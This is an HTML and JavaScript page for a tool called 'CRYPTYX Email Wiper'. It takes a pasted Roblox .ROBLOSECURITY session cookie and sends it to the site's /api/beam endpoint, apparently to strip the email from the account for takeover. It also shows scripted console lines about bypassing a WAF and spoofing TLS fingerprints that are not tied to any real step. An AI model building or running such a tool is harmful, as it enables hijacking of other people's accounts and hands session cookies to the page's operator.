<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CRYPTYX // EMAIL WIPER</title>
    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --neon-green: #00ff41;
            --cyan: #00ffff;
            --bg-color: #020202;
            --panel-bg: rgba(0, 8, 2, 0.9);
            --error-red: #ff3333;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            background-color: var(--bg-color);
            color: var(--neon-green);
            font-family: 'Fira Code', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
            position: relative;
            perspective: 1000px;
        }

        /* Matrix Rain */
        #matrix {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            z-index: -3; opacity: 0.15;
        }

        /* Ambient Glow */
        .radial-glow {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            width: 80vw; height: 80vh;
            background: radial-gradient(circle, rgba(0, 255, 65, 0.1) 0%, transparent 60%);
            z-index: -2; pointer-events: none;
            animation: pulse 4s infinite alternate;
        }
        @keyframes pulse { 0% { opacity: 0.5; } 100% { opacity: 1; } }

        /* CRT Scanlines */
        .scanlines {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(to bottom, rgba(255,255,255,0), rgba(255,255,255,0) 50%, rgba(0,0,0,0.3) 50%, rgba(0,0,0,0.3));
            background-size: 100% 4px;
            z-index: 10; pointer-events: none;
        }

        /* Main Container */
        .container {
            background: var(--panel-bg);
            border: 1px solid rgba(0, 255, 65, 0.3);
            border-radius: 8px;
            padding: 45px 35px;
            width: 100%;
            max-width: 520px;
            box-shadow: 0 0 30px rgba(0, 255, 65, 0.15), inset 0 0 40px rgba(0, 255, 65, 0.05);
            position: relative;
            backdrop-filter: blur(8px);
            transform-style: preserve-3d;
            transition: transform 0.1s ease, border-color 0.3s;
            overflow: hidden;
        }
        .container:hover { border-color: var(--neon-green); }

        /* Laser Scan Effect */
        .laser {
            position: absolute; top: 0; left: 0; width: 100%; height: 2px;
            background: var(--neon-green);
            box-shadow: 0 0 15px 3px var(--neon-green);
            animation: scan 4s linear infinite;
            z-index: 5; opacity: 0.5;
        }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }

        /* Terminal Header Dots */
        .terminal-header {
            display: flex; gap: 8px; position: absolute; top: 15px; left: 15px;
        }
        .dot { width: 10px; height: 10px; border-radius: 50%; }
        .dot.red { background: #ff5f56; box-shadow: 0 0 5px #ff5f56; }
        .dot.yellow { background: #ffbd2e; box-shadow: 0 0 5px #ffbd2e; }
        .dot.green { background: #27c93f; box-shadow: 0 0 5px #27c93f; }

        /* Header */
        .header { text-align: center; margin-bottom: 35px; }
        .glitch {
            font-family: 'Share Tech Mono', monospace;
            font-size: 3rem; font-weight: bold; color: #fff;
            text-shadow: 0 0 10px var(--neon-green), 0 0 20px var(--neon-green);
            position: relative; display: inline-block; letter-spacing: 4px;
            animation: flicker 3s infinite;
        }
        @keyframes flicker { 0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; } 20%, 22%, 24%, 55% { opacity: 0.5; } }
        
        .glitch::before, .glitch::after {
            content: attr(data-text); position: absolute; top: 0; left: 0;
            width: 100%; height: 100%; background: var(--panel-bg); overflow: hidden;
        }
        .glitch::before { left: 3px; text-shadow: -3px 0 var(--cyan); animation: glitch-anim-1 2s infinite linear alternate-reverse; }
        .glitch::after { left: -3px; text-shadow: -3px 0 #ff00ff; animation: glitch-anim-2 3s infinite linear alternate-reverse; }

        @keyframes glitch-anim-1 {
            0% { clip-path: inset(10% 0 80% 0); } 20% { clip-path: inset(50% 0 30% 0); }
            40% { clip-path: inset(20% 0 60% 0); } 60% { clip-path: inset(70% 0 10% 0); }
            80% { clip-path: inset(40% 0 40% 0); } 100% { clip-path: inset(80% 0 5% 0); }
        }
        @keyframes glitch-anim-2 {
            0% { clip-path: inset(70% 0 10% 0); } 20% { clip-path: inset(20% 0 60% 0); }
            40% { clip-path: inset(50% 0 30% 0); } 60% { clip-path: inset(10% 0 80% 0); }
            80% { clip-path: inset(60% 0 20% 0); } 100% { clip-path: inset(30% 0 50% 0); }
        }

        .subtitle { font-size: 0.85rem; color: var(--cyan); letter-spacing: 6px; margin-top: 8px; text-transform: uppercase; }

        /* Input */
        .form-group { margin-bottom: 25px; position: relative; }
        label {
            display: block; font-size: 0.75rem; color: var(--cyan);
            margin-bottom: 10px; text-transform: uppercase; letter-spacing: 2px; font-weight: 600;
        }
        label span { color: var(--neon-green); animation: blink 1s infinite; }
        input {
            width: 100%; background: rgba(0, 255, 65, 0.03); border: 1px solid rgba(0, 255, 65, 0.2);
            color: var(--neon-green); padding: 16px 16px 16px 45px; font-family: 'Fira Code', monospace;
            font-size: 0.95rem; outline: none; transition: all 0.3s ease; border-radius: 4px;
            letter-spacing: 1px;
        }
        input:focus {
            border-color: var(--neon-green); box-shadow: 0 0 20px rgba(0, 255, 65, 0.2);
            background: rgba(0, 255, 65, 0.08);
        }
        input::placeholder { color: rgba(0, 255, 65, 0.2); }
        .input-icon {
            position: absolute; left: 15px; top: 38px; color: var(--neon-green);
            font-size: 1.2rem; opacity: 0.5; pointer-events: none;
        }

        /* Progress Bar */
        .progress-container {
            width: 100%; height: 4px; background: rgba(0, 255, 65, 0.1);
            border-radius: 2px; margin-bottom: 25px; overflow: hidden; display: none;
        }
        .progress-bar {
            height: 100%; width: 0%; background: var(--neon-green);
            box-shadow: 0 0 10px var(--neon-green); transition: width 0.2s linear, background 0.3s;
        }

        /* Button */
        button {
            width: 100%; background: transparent; color: var(--neon-green);
            border: 2px solid var(--neon-green); padding: 18px;
            font-family: 'Share Tech Mono', monospace; font-size: 1.3rem; font-weight: bold;
            text-transform: uppercase; letter-spacing: 4px; cursor: pointer;
            transition: all 0.3s; position: relative; overflow: hidden;
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.1), inset 0 0 10px rgba(0, 255, 65, 0.1);
        }
        button:hover:not(:disabled) {
            background: var(--neon-green); color: #000;
            box-shadow: 0 0 40px rgba(0, 255, 65, 0.6);
            text-shadow: none;
        }
        button:disabled { border-color: #333; color: #555; cursor: wait; }
        
        /* Button Hover Sweep */
        button::after {
            content: ''; position: absolute; top: 0; left: -100%; width: 50%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.4), transparent);
            transition: 0.5s;
        }
        button:hover::after { left: 150%; }

        /* Console */
        .console {
            margin-top: 25px; background: rgba(0, 0, 0, 0.9); border-left: 3px solid var(--neon-green);
            padding: 15px; font-size: 0.8rem; min-height: 120px; max-height: 160px; overflow-y: auto;
            font-family: 'Fira Code', monospace; border-radius: 0 4px 4px 0;
            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.8);
        }
        .console .line { margin-bottom: 6px; line-height: 1.4; }
        .console .error { color: var(--error-red); text-shadow: 0 0 5px var(--error-red); }
        .console .success { color: var(--neon-green); text-shadow: 0 0 5px var(--neon-green); font-weight: bold; }
        .console .info { color: #888; }

        .cursor {
            display: inline-block; width: 8px; height: 14px; background: var(--neon-green);
            animation: blink 1s step-end infinite; vertical-align: bottom; margin-left: 5px;
        }
        @keyframes blink { 50% { opacity: 0; } }

        /* Scrollbar styling */
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(0, 255, 65, 0.3); border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: var(--neon-green); }
    </style>
</head>
<body>

    <canvas id="matrix"></canvas>
    <div class="radial-glow"></div>
    <div class="scanlines"></div>

    <div class="container" id="tilt-box">
        <div class="laser"></div>
        <div class="terminal-header">
            <div class="dot red"></div>
            <div class="dot yellow"></div>
            <div class="dot green"></div>
        </div>

        <div class="header">
            <div class="glitch" data-text="CRYPTYX">CRYPTYX</div>
            <div class="subtitle">Email Wiper</div>
        </div>

        <div class="form-group">
            <label><span>></span> AUTH_COOKIE</label>
            <div class="input-icon">🔑</div>
            <input type="password" id="cookie" placeholder="Paste .ROBLOSECURITY here..." required autocomplete="off">
        </div>

        <div class="progress-container" id="progress-container">
            <div class="progress-bar" id="progress-bar"></div>
        </div>

        <button id="execute-btn" type="button">Execute Wipe</button>

        <div class="console" id="console">
            <div class="line info">[*] System initialized. Awaiting auth cookie...</div>
            <div class="line info">[*] Ready.<div class="cursor"></div></div>
        </div>
    </div>

    <script>
        // --- 3D TILT EFFECT ---
        const box = document.getElementById('tilt-box');
        document.addEventListener('mousemove', (e) => {
            const x = (window.innerWidth / 2 - e.pageX) / 30;
            const y = (window.innerHeight / 2 - e.pageY) / 30;
            box.style.transform = `rotateY(${x}deg) rotateX(${y}deg)`;
        });
        document.addEventListener('mouseleave', () => {
            box.style.transform = `rotateY(0deg) rotateX(0deg)`;
        });

        // --- MATRIX RAIN EFFECT ---
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()';
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = [];
        for (let x = 0; x < columns; x++) drops[x] = 1;

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#00ff41';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = chars.charAt(Math.floor(Math.random() * chars.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 35);
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        // --- SCRAMBLE TEXT EFFECT FOR BUTTON ---
        const btn = document.getElementById('execute-btn');
        const originalText = "Execute Wipe";
        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+";
        let interval = null;

        function scrambleText() {
            let iteration = 0;
            clearInterval(interval);
            interval = setInterval(() => {
                btn.innerText = btn.innerText
                    .split("")
                    .map((letter, index) => {
                        if (index < iteration) return originalText[index];
                        return letters[Math.floor(Math.random() * letters.length)];
                    })
                    .join("");
                
                if (iteration >= originalText.length) clearInterval(interval);
                iteration += 1 / 3;
            }, 30);
        }

        // --- PROGRESS BAR LOGIC ---
        let progressInterval;
        let progressValue = 0;
        const progressContainer = document.getElementById('progress-container');
        const progressBar = document.getElementById('progress-bar');

        function startProgress() {
            progressContainer.style.display = 'block';
            progressBar.style.background = 'var(--neon-green)';
            progressBar.style.boxShadow = '0 0 10px var(--neon-green)';
            progressValue = 0;
            progressBar.style.width = '0%';
            
            progressInterval = setInterval(() => {
                if (progressValue < 90) {
                    progressValue += Math.random() * 8;
                    if (progressValue > 90) progressValue = 90;
                    progressBar.style.width = progressValue + '%';
                }
            }, 200);
        }

        function finishProgress(success) {
            clearInterval(progressInterval);
            progressValue = 100;
            progressBar.style.width = '100%';
            if (!success) {
                progressBar.style.background = 'var(--error-red)';
                progressBar.style.boxShadow = '0 0 10px var(--error-red)';
            }
            setTimeout(() => {
                progressContainer.style.display = 'none';
                progressBar.style.width = '0%';
            }, 2500);
        }

        // --- BEAM LOGIC ---
        btn.addEventListener('click', async () => {
            const consoleBox = document.getElementById('console');
            const cookie = document.getElementById('cookie').value.trim();
            
            if (!cookie) { 
                logToConsole("[!] ERR: AUTH_COOKIE is empty. Cannot proceed.", "error"); 
                return; 
            }
            
            btn.disabled = true;
            scrambleText();
            setTimeout(() => btn.innerText = "EXECUTING...", 400);
            
            consoleBox.innerHTML = ""; 
            logToConsole("[*] Initializing secure tunnel...", "info");
            startProgress();

            setTimeout(() => logToConsole("[*] Rotating proxies to bypass WAF...", "info"), 1000);
            setTimeout(() => logToConsole("[*] Generating spoofed TLS fingerprint...", "info"), 2000);
            setTimeout(() => logToConsole("[*] Sending payload to accountsettings endpoint...", "info"), 3000);

            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 12000); 
            
            try {
                const response = await fetch('/api/beam', {
                    method: 'POST', 
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ cookie }),
                    signal: controller.signal
                });
                clearTimeout(timeoutId);

                const result = await response.json();
                
                if (result.success) {
                    result.data.messages.forEach(msg => {
                        if (msg.includes("successfully") || msg.includes("wiped")) { 
                            logToConsole(`[+] ${msg}`, "success"); 
                        } else { 
                            logToConsole(`[-] ${msg}`, "error"); 
                        }
                    });
                    logToConsole("[*] Process terminated successfully.", "info");
                    finishProgress(true);
                } else { 
                    logToConsole(`[-] API ERR: ${result.message}`, "error"); 
                    finishProgress(false);
                }
            } catch (error) { 
                if (error.name === 'AbortError') {
                    logToConsole(`[-] FATAL: Request timed out. Vercel dropped connection.`, "error");
                } else {
                    logToConsole(`[-] NETWORK ERR: ${error.message}`, "error"); 
                }
                finishProgress(false);
            } finally { 
                btn.disabled = false;
                btn.innerText = "Execute Wipe";
            }
        });
        
        function logToConsole(text, type) {
            const consoleBox = document.getElementById('console');
            const div = document.createElement('div');
            div.className = `line ${type}`; 
            div.innerText = text;
            consoleBox.appendChild(div); 
            
            // Move cursor
            const oldCursors = documentBox = consoleBox.querySelectorAll('.cursor');
            oldCursors.forEach(c => c.remove());
            const cursor = document.createElement('div');
            cursor.className = 'cursor';
            div.appendChild(cursor);
            
            consoleBox.scrollTop = consoleBox.scrollHeight;
        }
    </script>
</body>
</html>
